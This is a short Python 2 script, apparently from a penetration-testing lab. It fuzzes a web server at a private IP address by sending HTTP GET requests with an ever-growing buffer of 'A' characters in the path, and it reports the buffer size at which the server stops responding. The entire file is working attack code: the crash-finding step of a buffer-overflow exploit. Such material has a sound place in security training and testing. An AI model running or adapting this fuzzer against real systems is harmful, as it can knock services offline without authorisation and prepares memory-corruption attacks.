#!/usr/bin/python
import socket
import sys
from time import sleep

target_address="192.168.130.192"
target_port=80
httpmethod = "GET"

buffer = "A" * 100


while True:
	try: 
               
		print "Trying to send %s bytes" % str(len(buffer))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target_address,target_port)) 
        	#s.recv(1024)
                sendbuf = httpmethod + " /%" + buffer + '\r\n\r\n'
		s.send(sendbuf)
        	data =  s.recv(1024)
                print data
		s.close()
		sleep(1)
		buffer = buffer + "A"*100

	except:

		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()


